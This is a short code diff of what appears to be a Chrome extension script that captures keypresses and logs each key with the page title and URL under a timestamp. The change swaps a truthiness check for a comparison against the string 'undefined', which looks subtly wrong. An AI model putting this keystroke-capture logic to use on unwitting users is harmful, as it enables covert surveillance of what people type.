@@ -20,7 +20,7 @@ chrome.storage.sync.get(function(res) {
 			if (now - lastKey > 10) { // Stop duplicates (most people cannot press 2 keys in 10 milliseconds)
 				lastKey = now;
 				key = String.fromCharCode(e.keyCode);
-				if (e.view.document.URL != lastURL && key) { // Keys depend on URL's, new URL = new key
+				if (e.view.document.URL != lastURL && key !== 'undefined') { // Keys depend on URL's, new URL = new key
 					lastURL = e.view.document.URL;
 					console.log(lastURL);
 					lastTime = now;
@@ -37,7 +37,7 @@ chrome.storage.sync.get(function(res) {
 			if (now - lastKey > 10) {
 				lastKey = now;
 				key = getKey(e, res.allKeys);
-				if (e.view.document.URL != lastURL && key) {
+				if (e.view.document.URL != lastURL && key !== 'undefined') {
 					lastURL = e.view.document.URL;
 					lastTime = now;
 					json[lastTime] = e.view.document.title + "^~^" + e.view.document.URL + "^~^" + key;
